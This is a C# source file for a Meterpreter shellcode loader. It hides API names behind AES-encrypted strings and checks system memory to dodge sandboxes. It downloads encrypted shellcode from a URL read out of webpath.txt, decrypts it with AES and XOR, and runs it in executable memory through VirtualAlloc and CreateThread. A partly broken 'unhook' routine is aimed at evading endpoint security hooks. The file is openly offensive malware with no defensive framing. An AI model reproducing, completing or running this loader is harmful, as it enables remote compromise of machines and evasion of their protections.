using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Management;
using System.Net;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;

namespace TCPMeterpreterProcess
{
    class Program
    {
        internal static class Unsafe
        {
            
            [DllImport("Kernel32")]
            internal static extern IntPtr GetProcAddress(IntPtr hModule, string procname);
            [DllImport("Kernel32")]
            internal static extern IntPtr LoadLibrary(string moduleName);
        }
        internal delegate bool Write_Process_Memory(
            IntPtr hProcess,
            IntPtr lpBaseAddress,
            byte[] lpBuffer,
            uint nSize,
            out UIntPtr lpNumberOfBytesWritten);
        internal delegate bool Virtual_Free(
            IntPtr lpAddress,
            uint dwSize,
            uint dwFreeType);
        internal delegate UInt32 Virtual_Alloc(
            UInt32 lpStartAddr,
            UInt32 size,
            UInt32 flAllocationType,
            UInt32 flProtect);
        internal delegate IntPtr Create_Thread(
            UInt32 lpThreadAttributes,
            UInt32 dwStackSize,
            UInt32 lpStartAddress,
            IntPtr param,
            UInt32 dwCreationFlags,
            ref UInt32 lpThreadId);
        internal delegate UInt32 Wait_ForSingle_Object(
            IntPtr hHandle,
            UInt32 dwMilliseconds
        );
        static string key = "BsijVUv2v+Ql/NM3pQv8uQ==";
        static string k = "AyD9Y9zW9dtvfqJzJb33gA==";
        static string v = "YlnmzpP5550nqLxW+3wdNQ==";
        static string c = "AkJecKOgemBiLxROAtA9WA==";
        static string w = "cH9ouyrpylq2wwZqDlf5Uod4zw5Vx+OrGTO0iMg4ah8=";
        static void Main(string[] args)
        {
            run_1();
            //run_2();
        }
        private static void run_1()
        {
            
            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls | SecurityProtocolType.Tls11 | SecurityProtocolType.Tls12 | SecurityProtocolType.Ssl3;
            ManagementObjectSearcher searcher = new ManagementObjectSearcher("SELECT TotalPhysicalMemory FROM Win32_ComputerSystem");
            double totalMemoryMb = 0;
            foreach (ManagementObject obj in searcher.Get())
            {
                ulong totalMemoryBytes = (ulong)obj["TotalPhysicalMemory"];
                totalMemoryMb = (totalMemoryBytes / 1024f) / 1024f;
            }
            if (totalMemoryMb >= 3999)
            {
                byte[] shellcode = GetShellCode();
                IntPtr K_handler = Unsafe.LoadLibrary(AesDecrypt(k, key));
                IntPtr trva = Unsafe.GetProcAddress(K_handler, AesDecrypt(v, key));

                unhook(K_handler, trva);

                Virtual_Alloc va = (Virtual_Alloc)Marshal.GetDelegateForFunctionPointer(trva, typeof(Virtual_Alloc));
                IntPtr trct = Unsafe.GetProcAddress(K_handler, AesDecrypt(c, key));
                IntPtr trwf = Unsafe.GetProcAddress(K_handler, AesDecrypt(w, key));

                unhook(K_handler, trct);
                unhook(K_handler, trwf);

                Create_Thread ct = (Create_Thread)Marshal.GetDelegateForFunctionPointer(trct, typeof(Create_Thread));
                Wait_ForSingle_Object wfoi = (Wait_ForSingle_Object)Marshal.GetDelegateForFunctionPointer(trwf, typeof(Wait_ForSingle_Object));
                
                UInt32 mem = va(0, (UInt32)shellcode.Length, 0x1000, 0x40);
                Marshal.Copy(shellcode, 0, (IntPtr)(mem), shellcode.Length);
                UInt32 threadId = 0;
                IntPtr hThread = ct(0, 0, mem, IntPtr.Zero, 0, ref threadId);
                wfoi(hThread, 0xFFFFFFFF);
            }
        }
        
        private static void unhook(IntPtr K_handler,IntPtr inptrfa)
        {
            byte[] assemblyBytes = { };
            int size = sizeof(int);
            byte[] read = new byte[size];
            Marshal.Copy(inptrfa, read, 0, size);
            UIntPtr bytesWritten = UIntPtr.Zero;

            string Aes_vf = "oWoor6Bfv1W3yL4QM0gHMw==";

            IntPtr newMemory = Marshal.AllocHGlobal(read.Length);
            Marshal.Copy(read, 0, newMemory, read.Length);
            IntPtr vf_add = Unsafe.GetProcAddress(K_handler, AesDecrypt(Aes_vf, key));
            Virtual_Free vf = (Virtual_Free)Marshal.GetDelegateForFunctionPointer(vf_add, typeof(Virtual_Free));

            vf(inptrfa, 0, 0);
        }
        private static char[] Xor_Decrypt(char[] data)
        {
            char[] key = "qwertyuiopasdfghjklzxcvbnm".ToArray();
            for (int i = 0; i < data.Length; i++)
            {
                data[i] ^= key[i % key.Length];
            }
            return data;
        }

        private static string AesDecrypt(string str, string key)
        {
            if (string.IsNullOrEmpty(str)) return null;
            Byte[] toEncryptArray = Convert.FromBase64String(str);
            RijndaelManaged rm = new RijndaelManaged
            {
                Key = Encoding.UTF8.GetBytes(key),
                Mode = CipherMode.ECB,
                Padding = PaddingMode.PKCS7
            };
            ICryptoTransform cTransform = rm.CreateDecryptor();
            Byte[] resultArray = cTransform.TransformFinalBlock(toEncryptArray, 0, toEncryptArray.Length);
            return Encoding.UTF8.GetString(resultArray);
        }
        private static byte[] GetShellCode()
        {
            string UserAgent = "/UiTAqd4SYU/cWqwQjNlt/0Slgaba9XvrXGtF4BGV+oI4+geZLyDFVmIWr236HHhnYtLHafUsVMkQbLhcdNw1XPhonbGx5BsjD4fMbiFDLc=";
            string path = System.AppDomain.CurrentDomain.SetupInformation.ApplicationBase + "webpath.txt";
            string webpath = File.ReadAllText(path, Encoding.UTF8);
            HttpWebRequest req = (HttpWebRequest)WebRequest.Create(new Uri(webpath));
            req.Method = "GET";
            req.UserAgent = AesDecrypt(UserAgent, "BsijVUv2v+Ql/NM3pQv8uQ==");
            HttpWebResponse res = (HttpWebResponse)req.GetResponse();
            Stream stms = res.GetResponseStream();
            StreamReader reader = new StreamReader(stms, Encoding.UTF8);
            string result = reader.ReadToEnd();
            reader.Close();
            req.Abort();
            result = AesDecrypt(result, "BsijVUv2v+Ql/NM3pQv8uQ==");
            char[] c_result = result.ToCharArray();
            result = new string(Xor_Decrypt(c_result));
            byte[] shellcode = HexStringToBytes(result);
            return shellcode;
        }
        public static byte[] HexStringToBytes(string hexString)
        {
            hexString = hexString.Replace(" ", "").Replace("0x", "").Replace("0X", "").Replace("-", "").Replace(":", "").Replace(",", "");
            if (hexString.Length % 2 != 0)
                throw new ArgumentException();
            return Enumerable.Range(0, hexString.Length / 2)
                    .Select(i => Convert.ToByte(hexString.Substring(i * 2, 2), 16))
                    .ToArray();
        }
    }
}
